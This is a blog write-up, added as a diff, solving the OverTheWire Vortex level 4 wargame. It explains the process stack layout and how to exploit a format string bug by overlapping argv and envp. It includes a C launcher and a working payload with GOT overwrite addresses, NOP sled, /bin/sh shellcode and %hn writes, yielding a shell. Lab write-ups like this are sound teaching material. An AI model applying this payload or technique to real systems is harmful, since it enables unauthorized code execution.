@@ -1,0 +1,279 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>overthewire.vortex.lvl[4-5] | neuromancer</title>
+  <meta name="author" content="Mustafa Algayar">
+  
+  <meta name="description" content="Level Goal
+This is the common format string bug, exploit it with care though as a check is made with argc. What is the layout of a process’s memory? H">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="overthewire.vortex.lvl[4-5]"/>
+  <meta property="og:site_name" content="neuromancer"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="neuromancer" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">neuromancer</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> overthewire.vortex.lvl[4-5]</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h1><hr>
+<blockquote><p>This is the common format string bug, exploit it with care though as a check is made with argc. What is the layout of a process’s memory? How are programs executed?.</p>
+<footer><strong>overthewire.vortex.</strong><cite><a href="https://overthewire.org/wargames/vortex/vortex4.html" target="_blank" rel="noopener">lvl4-5</a></cite></footer></blockquote>
+
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><hr>
+<p>in this level we exploit a format string vulnerability to gain access to next level’s password, the vulnerability resides in passing a user supplied/controlled input (in this case a program argument) to the printf() function.</p>
+<p>but as we can see the program exits immediately if at least one program argument was supplied, so how can we overcome this obstacle and leverage the vulnerability to dump the vortex5 user’s password ?!.</p>
+<p>the way to overcome this, is to know how the kernel setups the stack layout for the process when it’s first created (there is a lot of blogs/books/papers that explains this in detail so i will not cover it here instead i will just give the initial stack layout up until the moment of main()’s invocation from the startup code).</p>
+<h2 id="The-Stack-Layout"><a href="#The-Stack-Layout" class="headerlink" title="The Stack Layout"></a>The Stack Layout</h2><figure class="highlight plain"><figcaption><span>stack.layout</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+++++</span><br><span class="line">local variables of main</span><br><span class="line">saved registers of main</span><br><span class="line">return address of main</span><br><span class="line">argc</span><br><span class="line">argv</span><br><span class="line">envp</span><br><span class="line">+++++</span><br><span class="line">stack from startup code</span><br><span class="line">argc</span><br><span class="line">argv pointers</span><br><span class="line">NULL that ends argv[]</span><br><span class="line">environment pointers</span><br><span class="line">NULL that ends envp[]</span><br><span class="line">ELF Auxiliary Table</span><br><span class="line">+++++</span><br><span class="line">argv strings</span><br><span class="line">environment strings</span><br><span class="line">program name</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>
+
+
+<p>the thing we need to know that if a program was created without arguments vector then the first entry in the argv pointers vector will have NULL, now the trick is that we can overlap the evnironment pointers and the argv pointers vectors !.</p>
+<p>for an empty program arguments the argv[0] will hold NULL pointer and argc will hold 0.</p>
+<p>we know that the environment variables pointers vector follows the program arguments vector immediately (after the NULL pointer), so we can get the first entry in the evnironment variables vector with argv[1] or with envp[0].</p>
+<p>and that means we can treat the envp[2] pointer as the argv[3] pointer in that case!.</p>
+<p>so knowing this i wrote a program that will execute the vortex4 binary without program arguments vector and with crafted environment variables vector.</p>
+<figure class="highlight c"><figcaption><span>exploit.c</span><a href="https://github.com/En14c/rand0m.scr1pts/blob/master/ctf/wargames/overthewire/vortex/lvl4-5/exploit.c" target="_blank" rel="noopener">view on github</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *targetv[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: ./exp exploit_egg\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    targetv[<span class="number">0</span>] = <span class="string">"vodoo_magic_0"</span>;</span><br><span class="line">    targetv[<span class="number">1</span>] = <span class="string">"vodoo_magic_1"</span>;</span><br><span class="line">    targetv[<span class="number">2</span>] = argv[<span class="number">1</span>];</span><br><span class="line">    targetv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    execvpe(<span class="string">"/vortex/vortex4"</span>, <span class="literal">NULL</span>, targetv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>compile</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exp -m32</span><br></pre></td></tr></table></figure>
+
+
+<p>some informations about the environment as well as the target binary.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl4-5/01.png" alt="img01"></p>
+<p>the ASLR feature is turned off, we have an executable stack and the GOT is writeable.</p>
+<p>what we need to do to trigger a successful exploit is the following.</p>
+<ul>
+<li>overwrite the GOT entry for the exit() function with the address of the shellcode in the stack</li>
+<li>when crafting the exploit, do some NOP padding (will help us with a range of stack addresses so we don’t bother with hitting a specific address when crafting the size for the %n format parameter all we need to do is to examine the stack address for the program’s environment variables and choose an address in the middle of the NOP padding)</li>
+</ul>
+<p>now we have to craft the exploit and pass it as an argument to the vulnerable program, after some tinkering with the alignment i managed to trigger a successful exploit.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp $(python -c <span class="string">'print "\x14\xa0\x04\x08\x41\x41\x41\x41\x16\xa0\x04\x08\x41\x41\x41\x41" + "\x90"*203 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "%56950x" + "%103$hn" + "%8345x" + "%105$hn"'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>i first wrote the exploit then started testing without the \x41 alignments, and with every SEGFAULT i got i looked the address that cause the fault as well as the number that has been written to that address, using gdb to look at the instruction in the vfprintf() function that triggered the exception we know that the EAX register holds the address to write to and the ECX register holds the number to write.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl4-5/02.png" alt="img02"><br><img src="/images/ctf/wargames/overthewire/vortex/lvl4-5/03.png" alt="img03"></p>
+<p>so now triggering the exploit we manage to get a shell as user vortex5 !.</p>
+<p><img src="/images/ctf/wargames/overthewire/vortex/lvl4-5/04.png" alt="img04"></p>
+
+	  
+	</div>
+
+	
+	<span id="/2020/08/04/overthewire-vortex-lvl4-5-md/" class="leancloud-visitors view" data-flag-title="overthewire.vortex.lvl[4-5]">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/02/02/overthewire-vortex-lvl3-4/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-08-04 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/ctf/">ctf<span>26</span></a></li> <li><a href="/tags/wargames/">wargames<span>26</span></a></li> <li><a href="/tags/overthewire/">overthewire<span>26</span></a></li> <li><a href="/tags/vortex/">vortex<span>5</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2020 Mustafa Algayar's Blog
+  
+  powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
+  theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">
+      freemind.bithack</a>
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
